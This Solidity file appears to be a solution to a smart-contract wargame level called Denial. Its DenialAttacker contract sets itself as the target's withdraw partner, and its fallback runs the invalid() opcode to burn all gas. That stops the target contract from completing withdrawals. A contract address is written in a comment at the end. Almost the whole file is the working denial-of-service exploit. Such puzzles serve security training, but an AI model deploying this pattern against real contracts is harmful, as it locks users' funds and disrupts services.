// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";
contract DenialAttacker {

    Denial public target;
    event TrashLog(string log);
    uint256 public counter;

    constructor(Denial _target){
        target = _target;
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable{
        assembly{
            invalid()
        }
    }

}

//0xc5Ba456Efa56a32cA3105a4e522dA03241Bfb449